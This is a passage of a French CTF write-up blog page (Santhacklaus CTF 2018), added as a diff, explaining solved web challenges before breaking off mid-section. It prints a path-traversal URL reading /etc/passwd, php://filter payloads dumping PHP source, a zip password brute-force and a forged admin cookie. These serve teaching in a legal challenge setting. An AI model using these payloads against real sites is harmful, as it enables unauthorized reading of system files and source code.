@@ -1,0 +1,1351 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.53" />
+
+    
+    
+    
+
+<title>Santhacklaus CTF 2018 - Solved Challenges • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Santhacklaus CTF 2018 - Solved Challenges"/>
+<meta name="twitter:description" content="Le Santhacklaus CTF 2018 est un challenge Jeopardy en ligne, organisé par quatre étudiants de l&rsquo;IMT Lille Douai @_nwodtuhs @m3lsius @Ch3n4p4N @Deldel. Cet article traite des différents challenges que j&rsquo;ai réussi et eu le temps de faire."/>
+
+<meta property="og:title" content="Santhacklaus CTF 2018 - Solved Challenges" />
+<meta property="og:description" content="Le Santhacklaus CTF 2018 est un challenge Jeopardy en ligne, organisé par quatre étudiants de l&rsquo;IMT Lille Douai @_nwodtuhs @m3lsius @Ch3n4p4N @Deldel. Cet article traite des différents challenges que j&rsquo;ai réussi et eu le temps de faire." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/fr/writeups/santhacklausctf-2018/santhacklaus-ctf/" /><meta property="article:published_time" content="2018-12-27T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-12-27T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haaxmax.github.io">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haaxmax.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/writeups/santhacklausctf-2018/santhacklaus-ctf/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/writeups/santhacklausctf-2018/santhacklaus-ctf/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2018 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Santhacklaus CTF 2018 - Solved Challenges</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Dec 27, 2018
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 25 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Le Santhacklaus CTF 2018 est un challenge Jeopardy en ligne, organisé par quatre étudiants de l&rsquo;IMT Lille Douai <a href="https://twitter.com/_nwodtuhs" target="blank">@_nwodtuhs</a> <a href="https://twitter.com/m3lsius" target="blank">@m3lsius</a> <a href="https://twitter.com/Ch3n4p4N" target="blank">@Ch3n4p4N</a> <a href="https://twitter.com/Th4cho" target="blank">@Deldel</a>. Cet article traite des différents challenges que j&rsquo;ai réussi et eu le temps de faire.</p>
+
+<p>D&rsquo;une durée d&rsquo;une semaine, du 14/12 au 21/12, la compétition est également un projet étudiant réalisé dans le cadre de la formation des 4 auteurs. De mon point de vue, des challenges plutôt fun et intéressants. Je n&rsquo;ai pu le commencer qu&rsquo;à 2 jours et demi de la fin donc malheureusement pour moi je n&rsquo;ai pas eu le temps de me pencher sur les challenges les plus intéressants. C&rsquo;est néanmoins une 33e place avec 4390 points !</p>
+
+<p><center><img src="/img/writeups/santhacklausctf-2018/scoreChallengesHaax.png" alt="Santhacklaus Challenges" class="imgSize"/></center></p>
+
+<h3 id="sommaire">Sommaire</h3>
+
+<ul>
+<li><a href="#tl-dr">TL;DR</a></li>
+<li><a href="#web-challenges">Web Challenges</a>
+
+<ul>
+<li><a href="#i-got-404-problems-50-pts">I got 404 Problems - 50 pts</a></li>
+<li><a href="#authentication-2-0-100-pts">Authentication 2.0 - 100 pts</a></li>
+<li><a href="#the-flag-grabber-150-pts">The flag grabber - 150 pts</a></li>
+<li><a href="#arch-drive-1-3-150-pts">Arch Drive 1/3 - 150 pts</a></li>
+<li><a href="#arch-drive-2-3-150-pts">Arch Drive 2/3 - 150 pts</a></li>
+<li><a href="#shrt-200-pts">SHRT -  200 pts</a></li>
+<li><a href="#jeanclaude-vd-250-pts">Jeanclaude.vd - 250 pts</a></li>
+<li><a href="#be-my-valentine-400-pts">Be my Valentine - 400 pts</a></li>
+<li><a href="#3d-industry-1-2-400-pts">3D Industry (&frac12;) - 400 pts</a></li>
+<li><a href="#3d-industry-2-2-200-pts">3D Industry (2/2) - 200 pts</a></li>
+</ul></li>
+<li><a href="#forensics-et-réseau">Forensics et réseau</a>
+
+<ul>
+<li><a href="#playa-del-fuego-50-pts">Playa Del Fuego - 50 pts</a></li>
+<li><a href="#what-s-his-name-100-pts">What&rsquo;s his name ? - 100 pts</a></li>
+<li><a href="#pong-200-pts">Pong - 200 pts</a></li>
+<li><a href="#volatility101-250-pts">Volatility101 - 250 pts</a></li>
+</ul></li>
+<li><a href="#app-scripts-programmation">App Scripts &amp; Programmation</a>
+
+<ul>
+<li><a href="#mental-arithmetic-150-pts">Mental arithmetic - 150 pts</a></li>
+<li><a href="#on-the-road-again-150-pts">On the road again - 150 pts</a></li>
+<li><a href="#qrencoded-150-pts">QREncoded - 150 pts</a></li>
+</ul></li>
+<li><a href="#reverse-engineering">Reverse Engineering</a>
+
+<ul>
+<li><a href="#crackme-1-150-pts">Crackme 1 - 150 pts</a></li>
+<li><a href="#crackme-2-250-pts">Crackme 2 - 250 pts</a></li>
+</ul></li>
+<li><a href="#stéganographie-et-cryptographie">Stéganographie et Cryptographie</a>
+
+<ul>
+<li><a href="#slept-on-the-keyboard-50-pts">Slept on the keyboard - 50 pts</a></li>
+<li><a href="#xtracted-100-pts">Xtracted - 100 pts</a></li>
+<li><a href="#stego101-150-pts">Stego101 - 150 pts</a></li>
+</ul></li>
+<li><a href="#le-mot-de-la-fin">Le mot de la fin</a></li>
+</ul>
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<table>
+<thead>
+<tr>
+<th>Nom du challenge</th>
+<th>Catégorie</th>
+<th>Explications &amp; Description</th>
+<th>Valeur</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>I got 404 problems</td>
+<td>Web</td>
+<td>Page d&rsquo;erreur 404 personnalisée</td>
+<td>50</td>
+</tr>
+
+<tr>
+<td>Authentication 2.0</td>
+<td>Web</td>
+<td>Manipulation des méthodes GET et POST</td>
+<td>100</td>
+</tr>
+
+<tr>
+<td>The flag grabber</td>
+<td>Web</td>
+<td>Manipulation de code HTML/CSS/JS</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>Arch Drive 1/3</td>
+<td>Web</td>
+<td>Local File Inclusion classique</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>Arch Drive 2/3</td>
+<td>Web</td>
+<td>LFI avec wrapper PHP afin de récupérer un fichier</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>SHRT</td>
+<td>Web</td>
+<td>Manipulation des headers HTTP</td>
+<td>200</td>
+</tr>
+
+<tr>
+<td>jeanclaude.vd</td>
+<td>Web</td>
+<td>Fichier de sauvegarde automatique</td>
+<td>250</td>
+</tr>
+
+<tr>
+<td>Be my Valentine</td>
+<td>Web</td>
+<td>Exploitation Heartbleed</td>
+<td>400</td>
+</tr>
+
+<tr>
+<td>3D Industry &frac12;</td>
+<td>Web</td>
+<td>Exécution de code via LFI avec wrapper data://</td>
+<td>400</td>
+</tr>
+
+<tr>
+<td>3D Industry 2/2</td>
+<td>Stéganographie</td>
+<td>Fichier de modélisation 3D</td>
+<td>200</td>
+</tr>
+
+<tr>
+<td>Playa Del Fuego</td>
+<td>Forensics</td>
+<td>/</td>
+<td>50</td>
+</tr>
+
+<tr>
+<td>What&rsquo;s his name ?</td>
+<td>Réseau</td>
+<td>Telnet. Analyse de flux TCP</td>
+<td>100</td>
+</tr>
+
+<tr>
+<td>Pong</td>
+<td>Réseau</td>
+<td>Exfiltration de données via ICMP</td>
+<td>200</td>
+</tr>
+
+<tr>
+<td>Volatility101</td>
+<td>Forensics</td>
+<td>Récupération d&rsquo;informations sur un dump mémoire</td>
+<td>250</td>
+</tr>
+
+<tr>
+<td>Mental arithmetic</td>
+<td>Programmation</td>
+<td>Calcul automatisés en interaction avec un serveur</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>On the road again</td>
+<td>App-Script</td>
+<td>/</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>QREncoded</td>
+<td>Programmation</td>
+<td>Décodage massif de QRcodes afin de former une image</td>
+<td>200</td>
+</tr>
+
+<tr>
+<td>Crackme 1</td>
+<td>Reverse Engineering</td>
+<td>/</td>
+<td>150</td>
+</tr>
+
+<tr>
+<td>Crackme 2</td>
+<td>Reverse Engineering</td>
+<td>/</td>
+<td>250</td>
+</tr>
+
+<tr>
+<td>Slept on the keyboard</td>
+<td>Cryptographie</td>
+<td>/</td>
+<td>50</td>
+</tr>
+
+<tr>
+<td>Xtracted</td>
+<td>Cryptographie</td>
+<td>Brainfuck</td>
+<td>100</td>
+</tr>
+
+<tr>
+<td>Stego101</td>
+<td>Stéganographie</td>
+<td>Métadonnées et extraction en utilisant steghide</td>
+<td>150</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="web-challenges">Web Challenges</h2>
+
+<h3 id="i-got-404-problems-50-pts">I got 404 Problems - 50 pts</h3>
+
+<p>Simple challenge d&rsquo;introduction, pas de ressource sur laquelle taper. Le but du challenge tourne autour des erreurs 404.  Ainsi, on tente d&rsquo;accéder via la plateforme à une ressource inexistante.</p>
+
+<p><a href="https://santhacklaus.xyz/zzzz">https://santhacklaus.xyz/zzzz</a></p>
+
+<p>Et on se retrouve avec une page &ldquo;404&rdquo; personnalisée, affichant le premier flag : IMTLD{Th3_P4g3_w4s_n0T_f0uNd}.</p>
+
+<p><br/></p>
+
+<h3 id="authentication-2-0-100-pts">Authentication 2.0 - 100 pts</h3>
+
+<p>L&rsquo;énoncé &ldquo;Did you GET it&rdquo; indique clairement que le challenge tourne autour de la manipulation de méthodes HTTP. Ainsi, avec l&rsquo;utilitaire <code>curl</code>, il est possible de réaliser différentes requêtes. Une requête GET classique demande à l&rsquo;utilisateur d&rsquo;envoyer son nom d&rsquo;utilisateur (username) pour s&rsquo;authentifier.</p>
+
+<pre><code class="language-bash">$ curl -X GET https://authentication.santhacklaus.xyz/
+</code></pre>
+
+<p>Après quelques recherches sur un possible paramètre caché, j&rsquo;ai tenté de passer par la méthode POST. On récupère un retour différent demandant maintenant quel est notre nom d&rsquo;utilisateur.</p>
+
+<pre><code class="language-bash">$ curl -X POST https://authentication.santhacklaus.xyz/
+</code></pre>
+
+<p>En se basant sur le retour fait à l&rsquo;utilisateur &ldquo;What is your username ?&rdquo; on tente d&rsquo;envoyer un paramètre &ldquo;username&rdquo;.</p>
+
+<pre><code class="language-bash">$ curl -X POST https://authentication.santhacklaus.xyz/ --data &quot;username=Haax&quot;
+</code></pre>
+
+<p>La requête passe correctement mais le site nous indique que l&rsquo;utilisateur Haax ne dispose pas des permissions requises pour s&rsquo;authentifier. Étant donné qu&rsquo;il s&rsquo;agit d&rsquo;un challenge simple, on ne cherche pas très loin et on tente une requête avec l&rsquo;username &ldquo;admin&rdquo;.</p>
+
+<pre><code class="language-bash">$ curl -X POST https://authentication.santhacklaus.xyz/ --data &quot;username=admin&quot;
+</code></pre>
+
+<p>Le site nous répond avec le flag IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3} ! :)</p>
+
+<p><br/></p>
+
+<h3 id="the-flag-grabber-150-pts">The flag grabber - 150 pts</h3>
+
+<p>Il s&rsquo;agit ici d&rsquo;un challenge axé sur le Javascript. On arrive sur une page web contenant le code suivant.</p>
+
+<pre><code class="language-html">&lt;div id=&quot;cursor&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;I want my flag !&quot; name=&quot;false_button&quot; onclick=&quot;message()&quot;&gt;
+&lt;/div&gt;
+
+
+&lt;form method=&quot;POST&quot; id=&quot;formulaire&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;I want my flag !&quot; name=&quot;button&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>De plus, le code JavaScript suivant est également exécuté.</p>
+
+<pre><code class="language-javascript">&lt;script type=&quot;text/javascript&quot;&gt;
+document.onmousemove = function(e) {
+    if (!e) {
+        var e = window.event;
+    }
+
+    var mX = parseInt(e.pageX ? e.pageX : e.clientX, 10);
+    var mY = parseInt(e.pageY ? e.pageY : e.clientY, 10);
+
+    if (document.all) {
+        mX += document.documentElement.scrollLeft;
+        mY += document.documentElement.scrollTop;
+    }
+
+    mX = Math.min(Math.max(0, mX), 1500);
+    mY = Math.min(Math.max(0, mY), 1400);
+
+    document.getElementById(&quot;cursor&quot;).style.left = mX - 50 + 'px';
+    document.getElementById(&quot;cursor&quot;).style.top = mY - 12 + 'px';
+}
+&lt;/script&gt;
+</code></pre>
+
+<p>Il permet de faire en sorte qu&rsquo;un faux bouton suive la souris de l&rsquo;utilisateur. Ce bouton déclenche la fonction &ldquo;message()&rdquo; suite à un clic. Cette dernière affiche seulement un message du type &ldquo;Nice Try ! ;)&rdquo;.</p>
+
+<p>Il est également à noter que le formulaire &ldquo;formulaire&rdquo; possède le code CSS suivant.</p>
+
+<pre><code class="language-css">element {
+}
+
+#formulaire {
+    visibility: hidden;
+}
+
+body {
+    font-size: 2em;
+    line-height: 30px;
+    font-family: &quot;Myriad Pro&quot;, &quot;Trebuchet MS&quot;, Arial;
+}
+</code></pre>
+
+<p>Ainsi, deux choses sont à prendre en compte pour ce challenge :</p>
+
+<ul>
+<li>La visibilité du vrai formulaire, qui est par défaut caché via le CSS ;</li>
+<li>Le faux bouton qui suit l&rsquo;utilisateur.</li>
+</ul>
+
+<p>Pour ce qui est du formulaire, la propriété CSS <code>visibility: hidden</code> permet de le cacher. Il suffit ainsi d&rsquo;ouvrir l&rsquo;inspecteur d&rsquo;éléments et de décocher la case la propriété pour voir s&rsquo;afficher le vrai bouton. Cependant, on ne peut pas encore cliquer dessus, à cause du faux bouton suivant la souris.</p>
+
+<p>Pour cela, une méthode simple est de changer l&rsquo;identifiant du bouton dans le code HTML. En effet, on voit dans le code JavaScript que les opérations sont effectuées sur l&rsquo;élément HTML possédant l&rsquo;identifiant &ldquo;cursor&rdquo;. Ainsi, si dans l&rsquo;inspecteur, on modifie en direct l&rsquo;identifiant du faux bouton par une autre valeur, ce dernier s&rsquo;arrête de bouger et ne suit plus la souris.</p>
+
+<p>Ainsi, on peut soumettre le vrai formulaire et voir s&rsquo;afficher le flag IMTLD{J4v4scRipT_iS_W0nD3rFuL}.</p>
+
+<p><br/></p>
+
+<h3 id="arch-drive-1-3-150-pts">Arch Drive 1/3 - 150 pts</h3>
+
+<p>Premier challenge d&rsquo;une série de 5 challenges. On arrive sur la mire d&rsquo;authentification à un supposé service de stockage en ligne. Deux possibilités, tenter de bypass le formulaire de connexion ou tenter de passer par le reset du mot de passe. Quelques injections rapides sont tentées mais on se dirige rapidement vers la fonction de reset. Cette page est appelée de la façon suivante.</p>
+
+<pre><code>https://archdrive.santhacklaus.xyz/?page=reset.php
+</code></pre>
+
+<p>Premier réflexe : LFI !</p>
+
+<p>On tente donc de prouver la vulnérabilité en affichant le très connu &ldquo;/etc/passwd&rdquo;.</p>
+
+<pre><code>https://archdrive.santhacklaus.xyz/?page=../../../../etc/passwd
+</code></pre>
+
+<p>Ce qui nous donne le premier flag.. :)
+Ce challenge est simple mais il permet de montrer le point d&rsquo;entrée vers la suite.</p>
+
+<pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash 
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="arch-drive-2-3-150-pts">Arch Drive 2/3 - 150 pts</h3>
+
+<p>Suite du scénario, et dernier challenge pour ma part. Je n&rsquo;ai pas eu le temps de me pencher en détails sur les suivants.</p>
+
+<p>A ce stade, on dispose d&rsquo;une LFI. On a donc plusieurs possibilités. Ne connaissant que peu de fichiers accessibles (reset.php?) on va essayer de récupérer le plus d&rsquo;informations possible, en lisant par exemple le code source du site web. Une façon relativement simple de parvenir à cela est d&rsquo;utiliser les wrappers PHP. L&rsquo;un des plus connus est le wrapper &ldquo;php://filter&rdquo; permettant notamment d&rsquo;encoder le contenu d&rsquo;un fichier en base64, ce qui permet ensuite de récupérer le contenu du fichier, qui ne sera pas interprété car encodé.</p>
+
+<pre><code>https://archdrive.santhacklaus.xyz/?page=php://filter/convert.base64-encode/resource=reset.php
+</code></pre>
+
+<p>De même pour la page de connexion qui apporte des informations plus précises.</p>
+
+<pre><code>https://archdrive.santhacklaus.xyz/?page=php://filter/convert.base64-encode/resource=login.php
+</code></pre>
+
+<p>On remarque l&rsquo;appel à un fichier &ldquo;myfiles.php&rdquo;. Toujours pareil, on va fouiller afin de voir ce qu&rsquo;il contient.</p>
+
+<pre><code>https://archdrive.santhacklaus.xyz/?page=php://filter/convert.base64-encode/resource=myfiles.php
+</code></pre>
+
+<pre><code>&lt;p class=&quot;login100-form-title&quot; style=&quot;font-size: 24px&quot;&gt;My Recent Documents&lt;/p&gt;&lt;/br&gt;
+            &lt;ul&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/rib-bnp.gif&quot;&gt;rib-bnp.gif&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/test.html&quot;&gt;test.html&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;images/vacances1.jpg&quot;&gt;Vacances_2018_1.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip&quot;&gt;CONFIDENTIEL.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png&quot;&gt;facture_mobile_sfr.png&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/camel.jpg&quot;&gt;camel.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/cat.jpg&quot;&gt;cat.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/documents&quot;&gt;documents&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/funny_wtf.jpg&quot;&gt;funny_wtf.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/freshandhappy.mp3&quot;&gt;freshandhappy.mp3&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/intense.mp3&quot;&gt;intense.mp3&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/recup.zip&quot;&gt;recup.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/funny.jpg&quot;&gt;funny.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/goats.jpg&quot;&gt;goats.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/lol.jpg&quot;&gt;lol.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/rapport_SM.pdf&quot;&gt;rapport_SM.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/media&quot;&gt;media&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/these.pdf&quot;&gt;these.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/these-2.pdf&quot;&gt;these-2.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/wallpaper.jpg&quot;&gt;wallpaper.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/VeraCrypt.zip&quot;&gt;VeraCrypt.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+</code></pre>
+
+<p>Une jolie liste de fichiers ! Il est possible de les télécharger en y accédant directement dans un navigateur. Quelques fichiers inutiles mais également 3 archives ZIP. La seule intéressante pour ce challenge est l&rsquo;archive &ldquo;recup.zip&rdquo; protégée par un mot de passe. Let&rsquo;s bruteforce !</p>
+
+<pre><code class="language-bash">$ crackzip -u -D -p rockyou.txt recup.zip
+</code></pre>
+
+<p>Assez rapidement, le mot de passe &ldquo;hackerman&rdquo; est trouvé. On peut décompresser l&rsquo;archive et ainsi récupérer le flag IMTLD{F1nd_Y0uR_W4y} dans un fichier &ldquo;password.txt&rdquo;.</p>
+
+<p>NOTE : La suite du challenge semble se passer du côté des conteneurs VeraCrypt. Si vous voulez lire la solution, n&rsquo;hésitez pas à aller voir du côté de <a href="https://maki.bzh/courses/blog/writeups/santhacklaus2018/">https://maki.bzh/courses/blog/writeups/santhacklaus2018/</a></p>
+
+<p><br/></p>
+
+<h3 id="shrt-200-pts">SHRT -  200 pts</h3>
+
+<p>Burp Suite time ! En observant les requêtes, on remarque la présence d&rsquo;un cookie étrange :</p>
+
+<pre><code>Cookie: connexion= 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+</code></pre>
+
+<p>La chaine hexa donnée fait 64 caractères de long, ce qui correspond à un hash SHA256. Un rapide tour sur les bases de données de hash connues révèle la signification de ce dernier : &ldquo;stranger&rdquo;. Ok. A partir de là, si on veut passer, peut être faut-il construire un cookie de connexion en administrateur ?</p>
+
+<pre><code>&gt; $ echo -n &quot;admin&quot; | sha256sum
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+</code></pre>
+
+<p>On passe ça en cookie, et après on obtient la page suivante.</p>
+
+<pre><code>Are you the real administrator ?
+Remember: You need to come from the &quot;russian.deep-web.org&quot; website with the &quot;Black Hat Browser&quot; navigator !
+</code></pre>
+
+<p>Il semble donc qu&rsquo;il faille manipuler les en-têtes HTTP. La provenance peut se faire avec l&rsquo;en-tête &ldquo;Referer&rdquo; tandis que le navigateur est identifié par l&rsquo;en-tête &ldquo;User Agent&rdquo;. Ainsi, on construit une requête qui ressemble à ça.</p>
+
+<pre><code>GET / HTTP/1.1
+Host: srht.santhacklaus.xyz
+Referer: russian.deep-web.org
+User-Agent: Black Hat Browser
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: connexion=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+Upgrade-Insecure-Requests: 1
+</code></pre>
+
+<p>Résultat ?</p>
+
+<pre><code>Welcome back admin ! What do you want to do today ?
+ - Launch an attack against a government
+ - Consult secret documents
+
+Well done ! Take your flag: IMTLD{B3c4u5e_sQL_iNj3cti0n5_4r3_0v3r4tt3D}
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="jeanclaude-vd-250-pts">Jeanclaude.vd - 250 pts</h3>
+
+<p>Atterissage sur une fan page statique de Jean-Claude Van Damme. Quelques recherches classiques nous font aller vers le fichier &ldquo;robots.txt&rdquo;.</p>
+
+<pre><code>todo.txt
+admin.html
+</code></pre>
+
+<p>Le fichier &ldquo;admin.html&rdquo; semble ne pas être présent. Le fichier texte trouvé contient ceci :</p>
+
+<pre><code>TO CHECK  Delete the admin page (server crashed while editing)
+TO DO     Add a contact page
+TO DO     Create a Facebook page
+DONE      Watch Bloodsport
+DONE      Drink water, regularly
+</code></pre>
+
+<p>L&rsquo;information importante ici est la première ligne. Il est demandé de vérifier que la page d&rsquo;administration a bien été supprimée. En théorie, oui, car on ne peut plus y accéder. Néanmoins, il est spécifié que le serveur a crashé durant l&rsquo;édition, donc, pendant que l&rsquo;éditeur était ouvert.</p>
+
